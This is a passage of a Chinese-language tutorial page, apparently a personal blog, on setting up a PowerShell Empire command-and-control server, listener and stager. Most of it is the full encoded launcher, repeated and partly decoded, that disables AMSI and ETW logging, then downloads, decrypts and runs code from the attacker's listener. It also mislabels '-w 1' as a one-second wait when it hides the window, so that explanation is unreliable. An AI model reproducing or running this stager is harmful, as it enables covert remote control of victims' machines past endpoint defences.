</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><hr><h3 id="demo" tabindex="-1"><a class="header-anchor" href="#demo"><span>Demo</span></a></h3>`,61),J={href:"https://www.youtube.com/watch?v=wsSox64GqIU&t=635s",target:"_blank",rel:"noopener noreferrer"},T=n("hr",null,null,-1),K=n("h4",{id:"拓扑",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#拓扑"},[n("span",null,"拓扑")])],-1),R=t(`<hr><h4 id="起-server" tabindex="-1"><a class="header-anchor" href="#起-server"><span>起 server</span></a></h4><div class="language-&gt;bash line-numbers-mode" data-ext="&gt;bash" data-title="&gt;bash"><pre class="language-&gt;bash"><code>powershell-empire server
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282241575.png" alt="image-20230528224109503"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282241083.png" alt="image-20230528224140004"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282241665.png" alt="image-20230528224154585"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282242695.png" alt="image-20230528224209617"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282242881.png" alt="image-20230528224218807"></p></blockquote><hr><h4 id="起-client" tabindex="-1"><a class="header-anchor" href="#起-client"><span>起 Client</span></a></h4><p>新开一个 bash 起 client</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>powershell-empire client
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282237135.png" alt="image-20230528223724063"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282237526.png" alt="image-20230528223748461"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282238639.png" alt="image-20230528223804570"></p><hr></blockquote><hr><h4 id="新建一个-http-listener" tabindex="-1"><a class="header-anchor" href="#新建一个-http-listener"><span>新建一个 http listener</span></a></h4><p>起一个 http listener</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>uselistener http
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282249539.png" alt="image-20230528224951466"></p></blockquote><p>这里可以看到, 默认情况下 Host 和 BindIP 都绑定的本地, 这里保持该默认配置, 然后设置下 Port</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token comment"># Set Port</span>
<span class="token builtin class-name">set</span> Port <span class="token number">9090</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282304647.png" alt="image-20230528230437563"></p></blockquote><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token comment"># execute 以使用此 listener</span>
execute
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282305293.png" alt="image-20230528230556271"></p></blockquote><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token comment"># stager</span>
usestager multi_launcher
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282306410.png" alt="image-20230528230627366"></p></blockquote><p>可以看到 Language 默认为 powershell, 这里再设置一下 listener 为刚才创建的 http listener 然后执行</p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code><span class="token builtin class-name">set</span> listener http
execute
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282307913.png" alt="image-20230528230738873"></p><blockquote><p>PS: [+] New agent xxx checked in 那里是后面主机上线的提示, 刚执行完 execute 是不会出现的</p></blockquote></blockquote><p>上线命令如下:</p><div class="language-powershell line-numbers-mode" data-ext="powershell" data-title="powershell"><pre class="language-powershell"><code>powershell <span class="token operator">-</span>noP <span class="token operator">-</span>sta <span class="token operator">-</span>w 1 <span class="token operator">-</span>enc  SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABBAEEATQBBAEEAdQBBAEQARQBBAEwAZwBBAHgAQQBDADQAQQBNAFEAQQB6AEEARABZAEEATwBnAEEANQBBAEQAQQBBAE8AUQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AGMALgBQAHIAbwB4AHkAPQBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsAJAB3AGMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAB3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAnAEgAdQB2ACwAMwBnAHQAcwBjAH0AIwBfAEUAOgBmAEYAWAB3AG4AMgBiAFUAUABWAHwAaQBNAGUAMAArADUAUgAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAYwBIAEcAQQBmAGQATABaAEQAQwBFAHQATABNAEsAPQBsAEwAcQA4AFUAdwBpAEUAdQB6AHYASQBRAEQANABqADcAcAA2AEkASgBzAGgAaQBpADEARQA9ACIAKQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABhAHQAYQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAYQAuAGwAZQBuAGcAdABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li><code>powershell</code>：表示调用 PowerShell 程序。</li><li><code>-noP</code>：表示不加载配置文件。包括启动时加载的个人配置文件(Profile) 和系统级别的配置文件。使用此参数可以在启动 PowerShell 时跳过配置文件的加载，加快启动速度。</li><li><code>-sta</code>：<code>Single Threaded Apartment</code>表示使用单线程的会话模式。</li><li><code>-w 1</code>：等待指定的时间(以秒为单位) 后自动退出 PowerShell。在这里，<code>-w 1</code> 表示等待 1 秒后自动退出 PowerShell。</li><li><code>-enc</code>：表示后面跟着的是一个 Base64 编码的字符串，需要解码后执行。</li></ul><blockquote><div class="language-base64 line-numbers-mode" data-ext="base64" data-title="base64"><pre class="language-base64"><code>SQBmACgAJABQAFMAVgBlAHIAcwBpAG8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBpAG8AbgAuAE0AYQBqAG8AcgAgAC0AZwBlACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBlAHQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdAB2AGEAbAB1AGUAKAAkAE4AdQBsAGwALAAkAHQAcgB1AGUAKQA7AFsAUwB5AHMAdABlAG0ALgBEAGkAYQBnAG4AbwBzAHQAaQBjAHMALgBFAHYAZQBuAHQAaQBuAGcALgBFAHYAZQBuAHQAUAByAG8AdgBpAGQAZQByAF0ALgBHAGUAdABGAGkAZQBsAGQAKAAnAG0AXwBlAG4AYQBiAGwAZQBkACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwASQBuAHMAdABhAG4AYwBlACcAKQAuAFMAZQB0AFYAYQBsAHUAZQAoAFsAUgBlAGYAXQAuAEEAcwBzAGUAbQBiAGwAeQAuAEcAZQB0AFQAeQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBUAHIAYQBjAGkAbgBnAC4AUABTAEUAdAB3AEwAbwBnAFAAcgBvAHYAaQBkAGUAcgAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAnAGUAdAB3AFAAcgBvAHYAaQBkAGUAcgAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAEcAZQB0AFYAYQBsAHUAZQAoACQAbgB1AGwAbAApACwAMAApADsAfQA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoARQB4AHAAZQBjAHQAMQAwADAAQwBvAG4AdABpAG4AdQBlAD0AMAA7ACQAdwBjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAG4AaQBjAG8AZABlAC4ARwBlAHQAUwB0AHIAaQBuAGcAKABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBBADYAQQBDADgAQQBMAHcAQQB4AEEARABBAEEATQBBAEEAdQBBAEQARQBBAEwAZwBBAHgAQQBDADQAQQBNAFEAQQB6AEEARABZAEEATwBnAEEANQBBAEQAQQBBAE8AUQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAB3AGMALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAB3AGMALgBQAHIAbwB4AHkAPQBbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEQAZQBmAGEAdQBsAHQAVwBlAGIAUAByAG8AeAB5ADsAJAB3AGMALgBQAHIAbwB4AHkALgBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AQwByAGUAZABlAG4AdABpAGEAbABDAGEAYwBoAGUAXQA6ADoARABlAGYAYQB1AGwAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJAB3AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAnAEgAdQB2ACwAMwBnAHQAcwBjAH0AIwBfAEUAOgBmAEYAWAB3AG4AMgBiAFUAUABWAHwAaQBNAGUAMAArADUAUgAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AG4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBiAHgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHcAYwAuAEgAZQBhAGQAZQByAHMALgBBAGQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAYwBIAEcAQQBmAGQATABaAEQAQwBFAHQATABNAEsAPQBsAEwAcQA4AFUAdwBpAEUAdQB6AHYASQBRAEQANABqADcAcAA2AEkASgBzAGgAaQBpADEARQA9ACIAKQA7ACQAZABhAHQAYQA9ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAdgA9ACQAZABhAHQAYQBbADAALgAuADMAXQA7ACQAZABhAHQAYQA9ACQAZABhAHQAYQBbADQALgAuACQAZABhAHQAYQAuAGwAZQBuAGcAdABoAF0AOwAtAGoAbwBpAG4AWwBDAGgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABhAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>上述 base64 解码后得到:</p><div class="language-text line-numbers-mode" data-ext="text" data-title="text"><pre class="language-text"><code>&quot;I\\u0000f\\u0000(\\u0000$\\u0000P\\u0000S\\u0000V\\u0000e\\u0000r\\u0000s\\u0000i\\u0000o\\u0000n\\u0000T\\u0000a\\u0000b\\u0000l\\u0000e\\u0000.\\u0000P\\u0000S\\u0000V\\u0000e\\u0000r\\u0000s\\u0000i\\u0000o\\u0000n\\u0000.\\u0000M\\u0000a\\u0000j\\u0000o\\u0000r\\u0000 \\u0000-\\u0000g\\u0000e\\u0000 \\u00003\\u0000)\\u0000{\\u0000$\\u0000R\\u0000e\\u0000f\\u0000=\\u0000[\\u0000R\\u0000e\\u0000f\\u0000]\\u0000.\\u0000A\\u0000s\\u0000s\\u0000e\\u0000m\\u0000b\\u0000l\\u0000y\\u0000.\\u0000G\\u0000e\\u0000t\\u0000T\\u0000y\\u0000p\\u0000e\\u0000(\\u0000&#39;\\u0000S\\u0000y\\u0000s\\u0000t\\u0000e\\u0000m\\u0000.\\u0000M\\u0000a\\u0000n\\u0000a\\u0000g\\u0000e\\u0000m\\u0000e\\u0000n\\u0000t\\u0000.\\u0000A\\u0000u\\u0000t\\u0000o\\u0000m\\u0000a\\u0000t\\u0000i\\u0000o\\u0000n\\u0000.\\u0000A\\u0000m\\u0000s\\u0000i\\u0000U\\u0000t\\u0000i\\u0000l\\u0000s\\u0000&#39;\\u0000)\\u0000;\\u0000$\\u0000R\\u0000e\\u0000f\\u0000.\\u0000G\\u0000e\\u0000t\\u0000F\\u0000i\\u0000e\\u0000l\\u0000d\\u0000(\\u0000&#39;\\u0000a\\u0000m\\u0000s\\u0000i\\u0000I\\u0000n\\u0000i\\u0000t\\u0000F\\u0000a\\u0000i\\u0000l\\u0000e\\u0000d\\u0000&#39;\\u0000,\\u0000&#39;\\u0000N\\u0000o\\u0000n\\u0000P\\u0000u\\u0000b\\u0000l\\u0000i\\u0000c\\u0000,\\u0000S\\u0000t\\u0000a\\u0000t\\u0000i\\u0000c\\u0000&#39;\\u0000)\\u0000.\\u0000S\\u0000e\\u0000t\\u0000v\\u0000a\\u0000l\\u0000u\\u0000e\\u0000(\\u0000$\\u0000N\\u0000u\\u0000l\\u0000l\\u0000,\\u0000$\\u0000t\\u0000r\\u0000u\\u0000e\\u0000)\\u0000;\\u0000[\\u0000S\\u0000y\\u0000s\\u0000t\\u0000e\\u0000m\\u0000.\\u0000D\\u0000i\\u0000a\\u0000g\\u0000n\\u0000o\\u0000s\\u0000t\\u0000i\\u0000c\\u0000s\\u0000.\\u0000E\\u0000v\\u0000e\\u0000n\\u0000t\\u0000i\\u0000n\\u0000g\\u0000.\\u0000E\\u0000v\\u0000e\\u0000n\\u0000t\\u0000P\\u0000r\\u0000o\\u0000v\\u0000i\\u0000d\\u0000e\\u0000r\\u0000]\\u0000.\\u0000G\\u0000e\\u0000t\\u0000F\\u0000i\\u0000e\\u0000l\\u0000d\\u0000(\\u0000&#39;\\u0000m\\u0000_\\u0000e\\u0000n\\u0000a\\u0000b\\u0000l\\u0000e\\u0000d\\u0000&#39;\\u0000,\\u0000&#39;\\u0000N\\u0000o\\u0000n\\u0000P\\u0000u\\u0000b\\u0000l\\u0000i\\u0000c\\u0000,\\u0000I\\u0000n\\u0000s\\u0000t\\u0000a\\u0000n\\u0000c\\u0000e\\u0000&#39;\\u0000)\\u0000.\\u0000S\\u0000e\\u0000t\\u0000V\\u0000a\\u0000l\\u0000u\\u0000e\\u0000(\\u0000[\\u0000R\\u0000e\\u0000f\\u0000]\\u0000.\\u0000A\\u0000s\\u0000s\\u0000e\\u0000m\\u0000b\\u0000l\\u0000y\\u0000.\\u0000G\\u0000e\\u0000t\\u0000T\\u0000y\\u0000p\\u0000e\\u0000(\\u0000&#39;\\u0000S\\u0000y\\u0000s\\u0000t\\u0000e\\u0000m\\u0000.\\u0000M\\u0000a\\u0000n\\u0000a\\u0000g\\u0000e\\u0000m\\u0000e\\u0000n\\u0000t\\u0000.\\u0000A\\u0000u\\u0000t\\u0000o\\u0000m\\u0000a\\u0000t\\u0000i\\u0000o\\u0000n\\u0000.\\u0000T\\u0000r\\u0000a\\u0000c\\u0000i\\u0000n\\u0000g\\u0000.\\u0000P\\u0000S\\u0000E\\u0000t\\u0000w\\u0000L\\u0000o\\u0000g\\u0000P\\u0000r\\u0000o\\u0000v\\u0000i\\u0000d\\u0000e\\u0000r\\u0000&#39;\\u0000)\\u0000.\\u0000G\\u0000e\\u0000t\\u0000F\\u0000i\\u0000e\\u0000l\\u0000d\\u0000(\\u0000&#39;\\u0000e\\u0000t\\u0000w\\u0000P\\u0000r\\u0000o\\u0000v\\u0000i\\u0000d\\u0000e\\u0000r\\u0000&#39;\\u0000,\\u0000&#39;\\u0000N\\u0000o\\u0000n\\u0000P\\u0000u\\u0000b\\u0000l\\u0000i\\u0000c\\u0000,\\u0000S\\u0000t\\u0000a\\u0000t\\u0000i\\u0000c\\u0000&#39;\\u0000)\\u0000.\\u0000G\\u0000e\\u0000t\\u0000V\\u0000a\\u0000l\\u0000u\\u0000e\\u0000(\\u0000$\\u0000n\\u0000u\\u0000l\\u0000l\\u0000)\\u0000,\\u00000\\u0000)\\u0000;\\u0000}\\u0000;\\u0000[\\u0000S\\u0000y\\u0000s\\u0000t\\u0000e\\u0000m\\u0000.\\u0000N\\u0000e\\u0000t\\u0000.\\u0000S\\u0000e\\u0000r\\u0000v\\u0000i\\u0000c\\u0000e\\u0000P\\u0000o\\u0000i\\u0000n\\u0000t\\u0000M\\u0000a\\u0000n\\u0000a\\u0000g\\u0000e\\u0000r\\u0000]\\u0000:\\u0000:\\u0000E\\u0000x\\u0000p\\u0000e\\u0000c\\u0000t\\u00001\\u00000\\u00000\\u0000C\\u0000o\\u0000n\\u0000t\\u0000i\\u0000n\\u0000u\\u0000e\\u0000=\\u00000\\u0000;\\u0000$\\u0000w\\u0000c\\u0000=\\u0000N\\u0000e\\u0000w\\u0000-\\u0000O\\u0000b\\u0000j\\u0000e\\u0000c\\u0000t\\u0000 \\u0000S\\u0000y\\u0000s\\u0000t\\u0000e\\u0000m\\u0000.\\u0000N\\u0000e\\u0000t\\u0000.\\u0000W\\u0000e\\u0000b\\u0000C\\u0000l\\u0000i\\u0000e\\u0000n\\u0000t\\u0000;\\u0000$\\u0000u\\u0000=\\u0000&#39;\\u0000M\\u0000o\\u0000z\\u0000i\\u0000l\\u0000l\\u0000a\\u0000/\\u00005\\u0000.\\u00000\\u0000 \\u0000(\\u0000W\\u0000i\\u0000n\\u0000d\\u0000o\\u0000w\\u0000s\\u0000 \\u0000N\\u0000T\\u0000 \\u00006\\u0000.\\u00001\\u0000;\\u0000 \\u0000W\\u0000O\\u0000W\\u00006\\u00004\\u0000;\\u0000 \\u0000T\\u0000r\\u0000i\\u0000d\\u0000e\\u0000n\\u0000t\\u0000/\\u00007\\u0000.\\u00000\\u0000;\\u0000 \\u0000r\\u0000v\\u0000:\\u00001\\u00001\\u0000.\\u00000\\u0000)\\u0000 \\u0000l\\u0000i\\u0000k\\u0000e\\u0000 \\u0000G\\u0000e\\u0000c\\u0000k\\u0000o\\u0000&#39;\\u0000;\\u0000$\\u0000s\\u0000e\\u0000r\\u0000=\\u0000$\\u0000(\\u0000[\\u0000T\\u0000e\\u0000x\\u0000t\\u0000.\\u0000E\\u0000n\\u0000c\\u0000o\\u0000d\\u0000i\\u0000n\\u0000g\\u0000]\\u0000:\\u0000:\\u0000U\\u0000n\\u0000i\\u0000c\\u0000o\\u0000d\\u0000e\\u0000.\\u0000G\\u0000e\\u0000t\\u0000S\\u0000t\\u0000r\\u0000i\\u0000n\\u0000g\\u0000(\\u0000[\\u0000C\\u0000o\\u0000n\\u0000v\\u0000e\\u0000r\\u0000t\\u0000]\\u0000:\\u0000:\\u0000F\\u0000r\\u0000o\\u0000m\\u0000B\\u0000a\\u0000s\\u0000e\\u00006\\u00004\\u0000S\\u0000t\\u0000r\\u0000i\\u0000n\\u0000g\\u0000(\\u0000&#39;\\u0000a\\u0000A\\u0000B\\u00000\\u0000A\\u0000H\\u0000Q\\u0000A\\u0000c\\u0000A\\u0000A\\u00006\\u0000A\\u0000C\\u00008\\u0000A\\u0000L\\u0000w\\u0000A\\u0000x\\u0000A\\u0000D\\u0000A\\u0000A\\u0000M\\u0000A\\u0000A\\u0000u\\u0000A\\u0000D\\u0000E\\u0000A\\u0000L\\u0000g\\u0000A\\u0000x\\u0000A\\u0000C\\u00004\\u0000A\\u0000M\\u0000Q\\u0000A\\u0000z\\u0000A\\u0000D\\u0000Y\\u0000A\\u0000O\\u0000g\\u0000A\\u00005\\u0000A\\u0000D\\u0000A\\u0000A\\u0000O\\u0000Q\\u0000A\\u0000w\\u0000A\\u0000A\\u0000=\\u0000=\\u0000&#39;\\u0000)\\u0000)\\u0000)\\u0000;\\u0000$\\u0000t\\u0000=\\u0000&#39;\\u0000/\\u0000l\\u0000o\\u0000g\\u0000i\\u0000n\\u0000/\\u0000p\\u0000r\\u0000o\\u0000c\\u0000e\\u0000s\\u0000s\\u0000.\\u0000p\\u0000h\\u0000p\\u0000&#39;\\u0000;\\u0000$\\u0000w\\u0000c\\u0000.\\u0000H\\u0000e\\u0000a\\u0000d\\u0000e\\u0000r\\u0000s\\u0000.\\u0000A\\u0000d\\u0000d\\u0000(\\u0000&#39;\\u0000U\\u0000s\\u0000e\\u0000r\\u0000-\\u0000A\\u0000g\\u0000e\\u0000n\\u0000t\\u0000&#39;\\u0000,\\u0000$\\u0000u\\u0000)\\u0000;\\u0000$\\u0000w\\u0000c\\u0000.\\u0000P\\u0000r\\u0000o\\u0000x\\u0000y\\u0000=\\u0000[\\u0000S\\u0000y\\u0000s\\u0000t\\u0000e\\u0000m\\u0000.\\u0000N\\u0000e\\u0000t\\u0000.\\u0000W\\u0000e\\u0000b\\u0000R\\u0000e\\u0000q\\u0000u\\u0000e\\u0000s\\u0000t\\u0000]\\u0000:\\u0000:\\u0000D\\u0000e\\u0000f\\u0000a\\u0000u\\u0000l\\u0000t\\u0000W\\u0000e\\u0000b\\u0000P\\u0000r\\u0000o\\u0000x\\u0000y\\u0000;\\u0000$\\u0000w\\u0000c\\u0000.\\u0000P\\u0000r\\u0000o\\u0000x\\u0000y\\u0000.\\u0000C\\u0000r\\u0000e\\u0000d\\u0000e\\u0000n\\u0000t\\u0000i\\u0000a\\u0000l\\u0000s\\u0000 \\u0000=\\u0000 